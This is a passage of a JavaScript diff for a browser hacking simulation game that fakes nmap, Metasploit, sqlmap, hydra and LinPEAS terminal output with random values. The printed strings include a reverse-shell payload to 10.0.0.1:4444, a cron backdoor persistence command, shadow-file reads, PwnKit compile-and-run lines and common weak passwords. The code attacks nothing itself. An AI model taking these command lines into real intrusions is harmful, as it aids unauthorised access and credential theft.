+    if (ipArg && ipArg.indexOf('10.')===0) {
+        var srv = findServerByIp(data, ipArg);
+        if (srv) targets = [srv];
+    }
+    if (targets.length === 0) targets = cluster.servers.filter(function(s){return !s.isBroken;});
+    if (targets.length === 0) { termPrint('[-] 该群所有服务器已攻破', 'term-warn'); return; }
+
+    termPrint('Starting Nmap 7.92 ( https://nmap.org )', 'term-out');
+    termPrint('Nmap scan report for ' + cluster.name + ' (' + (ipArg || cluster.name + '/24') + ')', 'term-info');
+    termPrint('Host is up (0.00' + randInt(10,99) + 's latency).', 'term-out');
+    termPrint('', 'term-out');
+    
+    if (doScript) {
+        termPrint('Running script scan: ' + (scriptName || 'default'), 'term-info');
+    }
+    
+    // 异步逐台扫描 — targets引用的是data中的同一对象
+    targets.forEach(function(s, idx) {
+        setTimeout(function() {
+            var port = SERVICE_PORTS[s.serviceType] || 80;
+            var ver = SERVICE_VERSIONS[s.serviceType] || ['unknown'];
+            var version = ver[randInt(0, ver.length-1)];
+            var extraPorts = '';
+            
+            // 高等级服务器开放更多端口
+            if (s.level >= 5) {
+                extraPorts = '\n22/tcp   open  ssh        ' + (SERVICE_VERSIONS['SSH'][randInt(0,2)]) + '\n';
+                extraPorts += '21/tcp   open  ftp        ' + (SERVICE_VERSIONS['FTP'][randInt(0,2)]);
+            }
+            
+            termPrint('Nmap scan report for ' + s.ip, 'term-info');
+            termPrint('Host is up (' + (0.00 + Math.random()*0.05).toFixed(4) + 's latency).', 'term-out');
+            termPrint('', 'term-out');
+            termPrint('PORT     STATE SERVICE  VERSION', 'term-warn');
+            termPrint(port + '/tcp   open  ' + (s.serviceType.toLowerCase()) + (doVersion ? '    ' + version : ''), 'term-out');
+            if (extraPorts && doVersion) {
+                extraPorts.split('\n').forEach(function(line) {
+                    if (line.trim()) termPrint(line, 'term-out');
+                });
+            }
+            
+            if (doOS) {
+                termPrint('', 'term-out');
+                termPrint('OS detection: ' + s.os + ' (Linux ' + randInt(3,5) + '.' + randInt(0,19) + '.' + randInt(0,99) + ')', 'term-info');
+                termPrint('OS CPE: cpe:/o:linux:linux_kernel:' + randInt(3,5) + '.' + randInt(0,19), 'term-dim');
+                termPrint('Running: ' + s.os + ' ' + randInt(3,5) + '.X', 'term-dim');
+                termPrint('OS details: ' + s.os + ' ' + randInt(3,5) + '.' + randInt(0,19) + ' (' + (s.os==='Windows Server'?'Microsoft':'Linux') + ')', 'term-out');
+            }
+            
+            if (doScript) {
+                termPrint('', 'term-out');
+                termPrint('|_script-vuln: ' + s.vulnerabilities.length + ' potential vulnerabilities found', 'term-warn');
+                s.vulnerabilities.forEach(function(v) {
+                    var cv = VULN_CVE_MAP[v] || {cve:'CVE-2024-'+randInt(1000,9999), name:v};
+                    termPrint('| ' + cv.cve + ' - ' + cv.name, 'term-out');
+                    termPrint('|_  State: VULNERABLE (CVSS ' + (5 + s.level).toFixed(1) + ')', 'term-dim');
+                });
+            }
+            
+            s.reconDone = true; // 修改的是data中的同一对象引用
+            termPrint('', 'term-out');
+            
+            if (idx === targets.length - 1) {
+                termPrint('Nmap done: ' + targets.length + ' IP address(es) scanned in ' + (1 + Math.random()*3).toFixed(2) + ' seconds', 'term-ok');
+                termPrint('[+] 侦察完成！选中服务器查看详细漏洞', 'term-ok');
+                // Phase 4: 0day漏洞发现
+                tryZeroDayDiscovery(data, cluster);
+                saveData(data); // 保存同一份data
+                renderClusterView(data);
+                renderStats(data);
+                CMD_DATA = null;
+            }
+        }, idx * 200);
+    });
+}
+
+// ===== Whois 查询 =====
+function cmdWhois(server) {
+    termPrint('% IANA Whois Server', 'term-dim');
+    termPrint('% Source: IANA', 'term-dim');
+    termPrint('', 'term-out');
+    termPrint('Domain: ' + server.ip, 'term-info');
+    termPrint('Registrar: ARIN', 'term-out');
+    termPrint('Updated Date: 2025-' + randInt(1,12).toString().padStart(2,'0') + '-' + randInt(1,28).toString().padStart(2,'0'), 'term-out');
+    termPrint('Creation Date: 202' + randInt(0,5) + '-' + randInt(1,12).toString().padStart(2,'0') + '-' + randInt(1,28).toString().padStart(2,'0'), 'term-out');
+    termPrint('OrgName: ' + (server.os.includes('Windows') ? 'Microsoft Corp' : 'Linux Foundation'), 'term-out');
+    termPrint('Address: ' + randInt(1,999) + ' Network Blvd', 'term-out');
+    termPrint('City: ' + ['San Jose','Ashburn','Dallas','Seattle'][randInt(0,3)], 'term-out');
+    termPrint('StateProv: CA', 'term-out');
+    termPrint('Country: US', 'term-out');
+    termPrint('NetRange: ' + server.ip + ' - ' + server.ip.replace(/(\d+)$/, function(m){return String(parseInt(m)+255);}), 'term-info');
+    termPrint('CIDR: ' + server.ip + '/24', 'term-out');
+    termPrint('OrgId: ORG-' + ['NET1','ISP2','CORP3'][randInt(0,2)], 'term-out');
+    server.reconDone = true;
+    // server此时是CMD_DATA中的对象引用，直接保存CMD_DATA
+    var data = CMD_DATA || loadData();
+    saveData(data);
+    CMD_DATA = null;
+    termPrint('[+] Whois查询完成', 'term-ok');
+}
+
+// ===== 成功率计算 =====
+function calcSuccessRate(server, data, attackType) {
+    var base = 50;
+    var atkBonus = Math.min(30, Math.floor(data.player.attackPower / Math.max(1, server.defense) * 20));
+    var lvlPenalty = server.level * 3;
+    var rate = base + atkBonus - lvlPenalty;
+
+    var cluster = getServerCluster(data, server);
+    if (cluster && data.fbi.protectedClusters.indexOf(cluster.id) >= 0) {
+        var tunnelBroken = data.tunnel && data.tunnel.isBroken;
+        // 隧道破后FBI保护削弱70%：-20% → -6%
+        rate -= tunnelBroken ? 6 : 20;
+        // 蜜罐：隧道破后永久失效，-60% → 0
+        if (data.fbi.honeypotActive && !tunnelBroken) rate -= 60;
+    }
+
+    // 强制修复防御buff：成功率降低到10%
+    if (server.forceRepairBuff > 0) {
+        rate = Math.floor(rate * 0.1);
+    }
+
+    if (attackType === 'sql_injection' && server.serviceType === 'Database') rate += 15;
+    if (attackType === 'weak_ssh' && server.serviceType === 'SSH') rate += 15;
+    if (attackType === 'weak_ftp' && server.serviceType === 'FTP') rate += 15;
+    if (attackType === 'rce') rate += 5;
+    if (attackType === 'default_pass') rate += 10;
+
+        // Phase 3: 活跃病毒加成
+    var activeVirusBonus = (data.activeViruses || []).length * 3;
+    rate += activeVirusBonus;
+    // Phase 4: 0day漏洞加成
+    var unusedZeroDays = (data.zeroDays || []).filter(function(zd){ return !zd.used && !zd.sold && zd.expiryRound > (data.currentRound || 0); });
+    if (unusedZeroDays.length > 0) {
+        var best = unusedZeroDays[0];
+        var gOrder = {Critical:4, High:3, Medium:2, Low:1};
+        for (var z = 1; z < unusedZeroDays.length; z++) {
+            if ((gOrder[unusedZeroDays[z].grade] || 0) > (gOrder[best.grade] || 0)) best = unusedZeroDays[z];
+        }
+        rate += (ZERODAY_GRADES[best.grade] || {successBonus:0}).successBonus;
+    }
+    // Phase 5: 黑市工具加成
+    try {
+        var investRaw4 = localStorage.getItem('investSimState_v13');
+        if (investRaw4) {
+            var investSt4 = JSON.parse(investRaw4);
+            var hackTools = investSt4.hackTools || [];
+            hackTools.forEach(function(t) {
+                if (t.id === 'vuln_scanner' && t.usesLeft > 0) rate += 8;
+                if (t.id === 'pass_cracker' && t.usesLeft > 0 && (attackType === 'weak_ssh' || attackType === 'weak_ftp' || attackType === 'default_pass')) rate += 12;
+                if (t.id === 'traffic_obfuscator' && t.usesLeft > 0) rate += 5;
+                if (t.id === 'exploit_framework' && t.usesLeft > 0) rate += 10;
+            });
+        }
+    } catch(e) {}
+    return clamp(rate, 5, 95);
+}
+
+// ===== Metasploit 风格漏洞利用 =====
+function cmdExploitReal(server, vulnType) {
+    var data = CMD_DATA || loadData();
+    // 从data中重新查找同一台server（确保引用一致）
+    var cluster = null;
+    var srv = null;
+    for (var i = 0; i < data.clusters.length; i++) {
+        var found = data.clusters[i].servers.find(function(sv){return sv.id === server.id;});
+        if (found) { srv = found; cluster = data.clusters[i]; break; }
+    }
+    if (!srv) { termPrint('[-] 未找到目标服务器', 'term-err'); return; }
+    server = srv; // 使用data中的同一引用
+    
+    if (!server.reconDone) { termPrint('[-] 请先执行 nmap 扫描目标', 'term-err'); return; }
+    if (server.isBroken) { termPrint('[*] 该服务器已被攻破', 'term-warn'); return; }
+    
+    // 检查蜜罐（隧道攻破后蜜罐永久失效）
+    var tunnelBroken = data.tunnel && data.tunnel.isBroken;
+    if (!tunnelBroken && cluster && data.fbi.protectedClusters.indexOf(cluster.id) >= 0 && data.fbi.honeypotActive) {
+        termPrint('[!] WARNING: Honeypot detected on target network!', 'term-err');
+        termPrint('[!] Connection redirected to FBI honeypot node...', 'term-err');
+        if (Math.random() < 0.7) {
+            termPrint('[!] Your exploit payload was captured by honeypot!', 'term-err');
+            termPrint('[!] Session terminated. Attacker fingerprint logged.', 'term-err');
+            termPrint('[!] Attack power halved for 3 rounds', 'term-err');
+            termPrint('[!] FBI scan frequency doubled!', 'term-err');
+            data.fbi.honeypotDebuffEnds = data.currentRound + 3;
+            data.fbi.scanBoostEnds = data.currentRound + 3;
+            addLog(data, 'fbi', '蜜罐触发！攻击失败，攻击力减半3回合，扫描翻倍');
+            data.player.hackTraceScore += 10;
+            saveData(data);
+            renderStats(data);
+            return;
+        }
+    }
+
+    var actualVuln = vulnType === 'auto' ? (server.vulnerabilities[0] || 'rce') : vulnType;
+    var vulnInfo = VULN_CVE_MAP[actualVuln] || { cve: 'CVE-2024-'+randInt(1000,9999), name: actualVuln, msfModule: 'exploit/multi/http/generic' };
+    var rate = calcSuccessRate(server, data, actualVuln);
+    
+    // Metasploit 风格输出
+    termPrint('[*] Starting Metasploit exploit...', 'term-info');
+    termPrint('[*] Module: ' + vulnInfo.msfModule, 'term-info');
+    termPrint('[*] Target: ' + server.ip + ' (' + server.os + ')', 'term-info');
+    termPrint('[*] CVE: ' + vulnInfo.cve + ' - ' + vulnInfo.name, 'term-warn');
+    termPrint('[*] Payload: linux/x64/meterpreter/reverse_tcp', 'term-info');
+    termPrint('[*] LHOST: 10.0.0.1  LPORT: 4444', 'term-dim');
+    termPrint('[*] Sending exploit payload...', 'term-warn');
+    termPrint('[*] Success probability: ' + rate + '%', 'term-warn');
+
+    setTimeout(function() {
+        if (Math.random() * 100 < rate) {
+            var damage = Math.floor(server.maxHp * (0.3 + Math.random() * 0.4));
+            var frChk = checkForceRepair(server, data);
+            if (frChk.blocked) {
+                termPrint('[!] FBI FORCE REPAIR SHIELD: Attack blocked! (70% defense)', 'term-err');
+                termPrint('[*] 服务器处于强制修复保护中，剩余 ' + server.forceRepairBuff + ' 回合', 'term-warn');
+                addLog(data, 'fbi', '🛡️ 强制修复护盾拦截攻击: ' + server.name);
+                saveData(data); renderClusterView(data); renderStats(data); CMD_DATA = null;
+                return;
+            }
+            if (frChk.reduced) {
+                damage = Math.floor(damage * frChk.damageMul);
+                termPrint('[!] FBI强制修复防护：伤害减免90%！实际伤害 ' + damage, 'term-warn');
+            }
+            server.hp = Math.max(0, server.hp - damage);
+            
+            termPrint('[+] Exploit completed successfully!', 'term-ok');
+            termPrint('[+] Meterpreter session 1 opened (' + server.ip + ' -> 10.0.0.1:4444)', 'term-ok');
+            termPrint('[+] Shell session 2 opened', 'term-ok');
+            termPrint('[*] meterpreter > getuid', 'term-dim');
+            termPrint('[*] Server username: www-data', 'term-warn');
+            termPrint('[*] meterpreter > sysinfo', 'term-dim');
+            termPrint('[*] Computer: ' + server.name, 'term-ok');
+            termPrint('[*] OS: ' + server.os + ' ' + randInt(3,5) + '.' + randInt(0,19) + '.' + randInt(0,99), 'term-ok');
+            termPrint('[*] Architecture: x64', 'term-ok');
+            termPrint('[+] Damage dealt: ' + damage + ' HP', 'term-ok');
+
+            if (server.hp <= 0) {
+                markServerBroken(data, server, getServerCluster(data, server));
+                termPrint('', 'term-out');
+                termPrint('[*] meterpreter > hashdump', 'term-dim');
+                termPrint('[+] root:' + randHash() + ':0:0:root:/root:/bin/bash', 'term-ok');
+                termPrint('[+] admin:' + randHash() + ':1000:1000:admin:/home/admin:/bin/sh', 'term-ok');
+                termPrint('[*] meterpreter > persist -X -p 4444 -r 10.0.0.1', 'term-dim');
+                termPrint('[+] Persistent backdoor installed at /etc/cron.d/system-update', 'term-ok');
+                termPrint('', 'term-out');
+                termPrint('[★] ' + server.name + ' (' + server.ip + ') COMPROMISED!', 'term-ok');
+                termPrint('[★] Server fully owned. Root access obtained.', 'term-ok');
+                addLog(data, 'broken', server.name + ' (' + server.ip + ') 被 ' + vulnInfo.cve + ' 攻破！');
+                data.player.hackTraceScore += 3;
+                checkClusterBroken(data, cluster);
+            } else {
+                termPrint('[*] Server HP: ' + server.hp + '/' + server.maxHp + ' (' + Math.round(server.hp/server.maxHp*100) + '%)', 'term-warn');
+                termPrint('[*] Need more attacks to compromise. Try privesc or persist.', 'term-warn');
+            }
+        } else {
+            termPrint('[-] Exploit failed: target may have patched this vulnerability', 'term-err');
+            termPrint('[-] Connection reset by peer', 'term-err');
+            termPrint('[*] Meterpreter session closed', 'term-warn');
+            data.player.hackTraceScore += 1;
+        }
+        saveData(data);
+        renderClusterView(data);
+        renderStats(data);
+    }, 800 + Math.random() * 500);
+}
+
+function randHash() {
+    var chars = '0123456789abcdef';
+    var h = '$6$';
+    for (var i = 0; i < 22; i++) h += chars[randInt(0,15)];
+    return h;
+}
+
+// ===== sqlmap 真实输出 =====
+function cmdSqlmapReal(args, data) {
+    // 解析 -u <url>
+    var urlIdx = args.indexOf('-u');
+    var url = urlIdx >= 0 ? args[urlIdx+1] : null;
+    if (!url) { 
+        // 尝试找 http:// 开头的参数
+        url = args.find(function(a){return a.indexOf('http')===0;});
+    }
+    if (!url) { termPrint('[-] sqlmap: missing -u <url> parameter', 'term-err'); return; }
+    
+    var ip = url.replace(/^https?:\/\//, '').replace(/\/.*$/, '').replace(/:\d+$/, '');
+    var server = findServerByIp(data, ip);
+    if (!server) { termPrint('[-] sqlmap: target ' + ip + ' not found', 'term-err'); return; }
+    if (!server.reconDone) { termPrint('[-] 请先 nmap 扫描目标', 'term-err'); return; }
+    if (server.isBroken) { termPrint('[*] 该服务器已被攻破', 'term-warn'); return; }
+
+    var doDbs = args.indexOf('--dbs') >= 0;
+    var doDump = args.indexOf('--dump') >= 0;
+    var doTables = args.indexOf('--tables') >= 0;
+    var batchSize = args.indexOf('--batch') >= 0;
+    var cluster = getServerCluster(data, server);
+
+    termPrint('        ___', 'term-dim');
+    termPrint('       __H__', 'term-dim');
+    termPrint(' ___ ___[.]_____ ___ ___  {1.6.2#stable}', 'term-info');
+    termPrint('|_ -| . ["]     | .\'| . |', 'term-dim');
+    termPrint('|___|_  [.]_|_|_|__,|  _|', 'term-dim');
+    termPrint('      |_|V...       |_|   http://sqlmap.org', 'term-dim');
+    termPrint('', 'term-out');
+    termPrint('[*] starting @ ' + now() + ' EST', 'term-info');
+    termPrint('', 'term-out');
+    termPrint('[INFO] testing connection to the target URL', 'term-out');
+    termPrint('[INFO] checking if the target is protected by some kind of WAF/IPS', 'term-out');
+    termPrint('[INFO] testing if the target URL content is stable', 'term-out');
+    termPrint('[INFO] target URL content is stable', 'term-ok');
+    termPrint('[INFO] testing if GET parameter \'id\' is dynamic', 'term-out');
+    termPrint('[INFO] heuristic (basic) test shows that GET parameter \'id\' might be injectable', 'term-warn');
+    termPrint('[INFO] testing for SQL injection on GET parameter \'id\'', 'term-out');
+    termPrint('[INFO] testing \'AND boolean-based blind\'', 'term-out');
+    termPrint('[INFO] testing \'MySQL >= 5.5 AND error-based\'', 'term-out');
+    
+    setTimeout(function() {
+        var rate = calcSuccessRate(server, data, 'sql_injection');
+        if (server.serviceType === 'Database') rate += 15;
+        if (server.serviceType === 'HTTP' || server.serviceType === 'API') rate += 10;
+        rate = clamp(rate, 5, 95);
+        termPrint('[*] Injection probability: ' + rate + '%', 'term-warn');
+
+        if (Math.random() * 100 < rate) {
+            termPrint('[INFO] GET parameter \'id\' appears to be \'MySQL >= 5.5 AND error-based\' injectable', 'term-ok');
+            termPrint('[INFO] GET parameter \'id\' is \'MySQL >= 5.0 UNION-based\' injectable', 'term-ok');
+            termPrint('[INFO] the back-end DBMS is MySQL', 'term-ok');
+            termPrint('[INFO] fetched data logged to text files under \'/root/.local/share/sqlmap/output/' + server.ip + '\'', 'term-dim');
+            termPrint('', 'term-out');
+            
+            if (doDbs || (!doDump && !doTables)) {
+                termPrint('[INFO] fetching database names', 'term-out');
+                termPrint('[INFO] used SQL query returns 4 entries', 'term-dim');
+                termPrint('available databases [4]:', 'term-ok');
+                termPrint('[*] information_schema', 'term-out');
+                termPrint('[*] mysql', 'term-out');
+                termPrint('[*] ' + (cluster ? cluster.theme : 'app') + '_db', 'term-ok');
+                termPrint('[*] performance_schema', 'term-out');
+            }
+            if (doTables) {
+                termPrint('[INFO] fetching tables for database: ' + (cluster?cluster.theme:'app') + '_db', 'term-out');
+                termPrint('Database: ' + (cluster?cluster.theme:'app') + '_db', 'term-ok');
+                termPrint('[8 tables]', 'term-out');
+                termPrint('+-----------------+', 'term-dim');
+                termPrint('| users           |', 'term-ok');
+                termPrint('| admin           |', 'term-ok');
+                termPrint('| sessions        |', 'term-out');
+                termPrint('| orders          |', 'term-out');
+                termPrint('| products        |', 'term-out');
+                termPrint('| payments        |', 'term-ok');
+                termPrint('| logs            |', 'term-out');
+                termPrint('| config          |', 'term-ok');
+                termPrint('+-----------------+', 'term-dim');
+            }
+            if (doDump) {
+                termPrint('[INFO] fetching entries of table(s) \'users\'', 'term-out');
+                termPrint('[INFO] fetching columns for table \'users\'', 'term-out');
+                termPrint('[INFO] retrieved: 6 columns', 'term-dim');
+                termPrint('Database: ' + (cluster?cluster.theme:'app') + '_db', 'term-ok');
+                termPrint('Table: users', 'term-ok');
+                termPrint('[42 entries]', 'term-out');
+                termPrint('+----+----------+----------------------------------+-------------------+', 'term-dim');
+                termPrint('| id| username | password                         | email             |', 'term-warn');
+                termPrint('+----+----------+----------------------------------+-------------------+', 'term-dim');
+                termPrint('| 1 | admin    | ' + randHash().substring(0,32) + '...| admin@target.com  |', 'term-ok');
+                termPrint('| 2 | root     | ' + randHash().substring(0,32) + '...| root@target.com   |', 'term-ok');
+                termPrint('| 3 | user1    | ' + randHash().substring(0,32) + '...| user1@target.com  |', 'term-out');
+                termPrint('| ..| ...      | ...                              | ...               |', 'term-dim');
+                termPrint('+----+----------+----------------------------------+-------------------+', 'term-dim');
+            }
+            
+            var damage = Math.floor(server.maxHp * (0.4 + Math.random() * 0.3));
+            var frChk = checkForceRepair(server, data);
+            if (frChk.blocked) {
+                termPrint('[!] FBI FORCE REPAIR SHIELD: Attack blocked! (70% defense)', 'term-err');
+                termPrint('[*] 服务器处于强制修复保护中，剩余 ' + server.forceRepairBuff + ' 回合', 'term-warn');
+                addLog(data, 'fbi', '🛡️ 强制修复护盾拦截攻击: ' + server.name);
+                saveData(data); renderClusterView(data); renderStats(data); CMD_DATA = null;
+                return;
+            }
+            if (frChk.reduced) {
+                damage = Math.floor(damage * frChk.damageMul);
+                termPrint('[!] FBI强制修复防护：伤害减免90%！实际伤害 ' + damage, 'term-warn');
+            }
+            server.hp = Math.max(0, server.hp - damage);
+            termPrint('', 'term-out');
+            termPrint('[+] SQL injection successful! Data exfiltrated.', 'term-ok');
+            termPrint('[+] Damage dealt: ' + damage + ' HP', 'term-ok');
+            termPrint('[*] shut down at ' + now(), 'term-dim');
+            
+            if (server.hp <= 0) {
+                markServerBroken(data, server, getServerCluster(data, server));
+                termPrint('', 'term-out');
+                termPrint('[★] ' + server.name + ' COMPROMISED via SQL injection!', 'term-ok');
+                addLog(data, 'broken', server.name + ' 通过SQL注入被攻破！');
+                checkClusterBroken(data, cluster);
+            }
+        } else {
+            termPrint('[WARNING] GET parameter \'id\' does not appear to be injectable', 'term-err');
+            termPrint('[WARNING] target appears to be using parameterized queries', 'term-err');
+            termPrint('[*] shut down at ' + now(), 'term-dim');
+        }
+        saveData(data);
+        renderClusterView(data);
+        renderStats(data);
+    }, 1200);
+}
+
+// ===== hydra 真实密码爆破 =====
+function cmdHydraReal(args, data) {
+    // 解析: hydra -L users.txt -P rockyou.txt <ip> <service>
+    var ip = args.find(function(a){return a.indexOf('10.')===0;});
+    var service = args.find(function(a){return ['ssh','ftp','http','mysql','rdp','smb','telnet'].indexOf(a)>=0;});
+    if (!ip) { termPrint('[-] hydra: missing target host', 'term-err'); return; }
+    
+    var server = findServerByIp(data, ip);
+    if (!server) { termPrint('[-] hydra: target ' + ip + ' not found', 'term-err'); return; }
+    if (!server.reconDone) { termPrint('[-] 请先 nmap 扫描目标', 'term-err'); return; }
+    if (server.isBroken) { termPrint('[*] 该服务器已被攻破', 'term-warn'); return; }
+
+    if (!service) service = (server.serviceType || 'ssh').toLowerCase();
+    var threads = 4;
+    var tIdx = args.indexOf('-t');
+    if (tIdx >= 0 && args[tIdx+1]) threads = parseInt(args[tIdx+1], 10) || 4;
+    var stopOnSuccess = args.indexOf('-f') >= 0;
+    var cluster = getServerCluster(data, server);
+
+    termPrint('Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak', 'term-info');
+    termPrint('', 'term-out');
+    termPrint('[DATA] max ' + threads + ' tasks per 1 server, overall ' + threads + ' tasks', 'term-out');
+    termPrint('[DATA] attacking ' + service + '://' + server.ip + ':22/', 'term-out');
+    termPrint('[DATA] loading usernames from users.txt', 'term-dim');
+    termPrint('[DATA] loading passwords from rockyou.txt', 'term-dim');
+    termPrint('[INFO] 14344391 password entries loaded', 'term-dim');
+    termPrint('', 'term-out');
+
+    var rate = calcSuccessRate(server, data, server.vulnerabilities.indexOf('default_pass')>=0 ? 'default_pass' : 'weak_ssh');
+    if (server.serviceType.toLowerCase() === service.toUpperCase()) rate += 15;
+    rate = clamp(rate, 5, 95);
+
+    // 模拟爆破过程
+    var attempts = 0;
+    var maxAttempts = 8;
+    var cracked = Math.random() * 100 < rate;
+    var crackUser = ['admin', 'root', 'postgres', 'www-data', 'test'][randInt(0,4)];
+    var crackPass = ['admin123', 'password', '12345678', 'P@ssw0rd', 'root', 'admin', 'qwerty'][randInt(0,6)];
+    
+    var attemptInterval = setInterval(function() {
+        attempts++;
+        var testUser = ['admin', 'root', 'user', 'test', 'postgres', 'guest'][randInt(0,5)];
+        var testPass = ['123456', 'password', 'admin', 'root', 'qwerty', 'letmein', 'welcome'][randInt(0,6)];
+        
+        if (attempts < maxAttempts && (!stopOnSuccess || !cracked)) {
+            termPrint('[' + attempts + '][' + service + '] host: ' + server.ip + '   login: ' + testUser + '   password: ' + testPass + '  [-] FAIL', 'term-err');
+        }
+        
+        if (attempts >= maxAttempts || (stopOnSuccess && cracked && attempts >= 3)) {
+            clearInterval(attemptInterval);
+            if (cracked) {
+                termPrint('[' + (attempts+1) + '][' + service + '] host: ' + server.ip + '   login: ' + crackUser + '   password: ' + crackPass + '  [+] SUCCESS', 'term-ok');
+                termPrint('[+] Cracked! Credentials: ' + crackUser + ':' + crackPass, 'term-ok');
+                termPrint('[+] ' + attempts + ' of 14344391 completed. Valid password found.', 'term-ok');
+                
+                var damage = Math.floor(server.maxHp * (0.35 + Math.random() * 0.35));
+                var frChk = checkForceRepair(server, data);
+                if (frChk.blocked) {
+                    termPrint('[!] FBI FORCE REPAIR SHIELD: Attack blocked! (70% defense)', 'term-err');
+                    termPrint('[*] 服务器处于强制修复保护中，剩余 ' + server.forceRepairBuff + ' 回合', 'term-warn');
+                    addLog(data, 'fbi', '🛡️ 强制修复护盾拦截攻击: ' + server.name);
+                    saveData(data); renderClusterView(data); renderStats(data); CMD_DATA = null;
+                    return;
+                }
+                if (frChk.reduced) {
+                    damage = Math.floor(damage * frChk.damageMul);
+                    termPrint('[!] FBI强制修复防护：伤害减免90%！实际伤害 ' + damage, 'term-warn');
+                }
+                server.hp = Math.max(0, server.hp - damage);
+                termPrint('[+] Shell access obtained via ' + service, 'term-ok');
+                termPrint('[+] Damage dealt: ' + damage + ' HP', 'term-ok');
+                
+                if (server.hp <= 0) {
+                    markServerBroken(data, server, getServerCluster(data, server));
+                    termPrint('[★] ' + server.name + ' COMPROMISED via credential brute force!', 'term-ok');
+                    addLog(data, 'broken', server.name + ' 通过密码爆破 (' + crackUser + ':' + crackPass + ') 被攻破！');
+                    checkClusterBroken(data, cluster);
+                }
+            } else {
+                termPrint('[ERROR] all passwords were found unsuccessful', 'term-err');
+                termPrint('[-] ' + attempts + ' of 14344391 completed. No valid password found.', 'term-err');
+                termPrint('[*] Target may have rate limiting or strong password policy', 'term-warn');
+            }
+            saveData(data);
+            renderClusterView(data);
+            renderStats(data);
+        }
+    }, 300);
+}
+
+// ===== LinPEAS 风格提权扫描 =====
+function cmdPrivescReal(server) {
+    var data = CMD_DATA || loadData();
+    // 从data中重新查找server确保引用一致
+    var srv = null, cluster = null;
+    for (var i = 0; i < data.clusters.length; i++) {
+        var f = data.clusters[i].servers.find(function(sv){return sv.id === server.id;});
+        if (f) { srv = f; cluster = data.clusters[i]; break; }
+    }
+    if (!srv) { termPrint('[-] 未找到目标服务器', 'term-err'); return; }
+    server = srv;
+    if (server.isBroken) { termPrint('[*] 该服务器已被攻破', 'term-warn'); return; }
+    if (server.hp >= server.maxHp) { termPrint('[-] 需先获得初始Shell (exploit降低HP)', 'term-err'); return; }
+
+    termPrint('[*] Executing LinPEAS (Linux Privilege Escalation Awesome Script)', 'term-info');
+    termPrint('[*] Target: ' + server.ip + ' (' + server.os + ')', 'term-info');
+    termPrint('[*] Current user: www-data (uid=33, gid=33)', 'term-warn');
+    termPrint('', 'term-out');
+    
+    setTimeout(function() {
+        termPrint('╔══════════════════════════════════════════════╗', 'term-info');
+        termPrint('║           LINPEAS SCAN RESULTS               ║', 'term-info');
+        termPrint('╚══════════════════════════════════════════════╝', 'term-info');
+        termPrint('', 'term-out');
+        
+        termPrint('[+] SUID Files:', 'term-warn');
+        termPrint('  -rwsr-xr-x 1 root root 31K Oct 16 2021 /usr/bin/pkexec', 'term-ok');
+        termPrint('  -rwsr-xr-x 1 root root 55K Jan 25 2022 /usr/bin/su', 'term-out');
+        termPrint('  -rwsr-xr-x 1 root root 163K Jan 12 2022 /usr/bin/sudo', 'term-out');
+        termPrint('  -rwsr-xr-x 1 root root 44K Apr  8 2022 /usr/bin/passwd', 'term-out');
+        termPrint('', 'term-out');
+        
+        termPrint('[+] Capabilities:', 'term-warn');
+        termPrint('  /usr/bin/python3.8 = cap_setuid+ep', 'term-ok');
+        termPrint('', 'term-out');
+        
+        termPrint('[+] Cron Jobs:', 'term-warn');
+        termPrint('  */5 * * * * root /opt/backup.sh (WRITABLE!)', 'term-ok');
+        termPrint('  0 2 * * * root /usr/local/bin/cleanup.sh', 'term-out');
+        termPrint('', 'term-out');
+        
+        termPrint('[+] Interesting Files:', 'term-warn');
+        termPrint('  -rw-r--r-- 1 root root 1.2K /etc/shadow (READABLE!)', 'term-ok');
+        termPrint('  -rw-rw-r-- 1 root root  456 /opt/config/database.yml', 'term-ok');
+        termPrint('  -rwxrwxrwx 1 root root  789 /tmp/start.sh (WRITABLE!)', 'term-ok');
+        termPrint('', 'term-out');
+        
+        termPrint('[+] Vulnerable Software:', 'term-warn');
+        termPrint('  Sudo 1.8.31 - CVE-2021-3156 (Baron Samedit)', 'term-ok');
+        termPrint('  Polkit 0.105 - CVE-2021-4034 (PwnKit)', 'term-ok');
+        termPrint('  pkexec 0.105 - CVE-2021-4034 (PwnKit)', 'term-ok');
+        termPrint('', 'term-out');
+        
+        termPrint('[+] Suggest exploitation:', 'term-warn');
+        termPrint('  [1] /usr/bin/pkexec -> CVE-2021-4034 (PwnKit)', 'term-ok');
+        termPrint('  [2] /opt/backup.sh -> Cron job hijack', 'term-ok');
+        termPrint('  [3] /usr/bin/python3.8 -> cap_setuid exploitation', 'term-ok');
+        termPrint('', 'term-out');
+
+        var rate = 60 + server.level * 2;
+        rate = clamp(rate, 20, 85);
+        
+        if (Math.random() * 100 < rate) {
+            var damage = Math.floor(server.maxHp * 0.25);
+            var frChk = checkForceRepair(server, data);
+            if (frChk.blocked) {
+                termPrint('[!] FBI FORCE REPAIR SHIELD: Attack blocked! (70% defense)', 'term-err');
+                termPrint('[*] 服务器处于强制修复保护中，剩余 ' + server.forceRepairBuff + ' 回合', 'term-warn');
+                addLog(data, 'fbi', '🛡️ 强制修复护盾拦截攻击: ' + server.name);
+                saveData(data); renderClusterView(data); renderStats(data); CMD_DATA = null;
+                return;
+            }
+            if (frChk.reduced) {
+                damage = Math.floor(damage * frChk.damageMul);
+                termPrint('[!] FBI强制修复防护：伤害减免90%！实际伤害 ' + damage, 'term-warn');
+            }
+            server.hp = Math.max(0, server.hp - damage);
+            termPrint('[*] Attempting CVE-2021-4034 (PwnKit)...', 'term-info');
+            termPrint('[*] Compiling exploit...', 'term-dim');
+            termPrint('[*] gcc pwnkit.c -o pwnkit -Wall', 'term-dim');
+            termPrint('[*] ./pwnkit', 'term-dim');
+            termPrint('[+] PwnKit exploit successful!', 'term-ok');
+            termPrint('[+] uid=0(root) gid=0(root) groups=0(root)', 'term-ok');
+            termPrint('[+] # whoami', 'term-dim');
+            termPrint('[+] root', 'term-ok');
+            termPrint('[+] Privilege escalation complete! Damage: ' + damage + ' HP', 'term-ok');
+            
+            if (server.hp <= 0) {
+                markServerBroken(data, server, getServerCluster(data, server));
+                termPrint('[★] ' + server.name + ' ROOT ACCESS OBTAINED!', 'term-ok');
+                termPrint('[★] # cat /etc/shadow', 'term-dim');
+                termPrint('[★] root:' + randHash() + ':19000:0:99999:7:::', 'term-ok');
+                addLog(data, 'broken', server.name + ' 通过PwnKit提权获得root！');
+                checkClusterBroken(data, cluster);
+            } else {
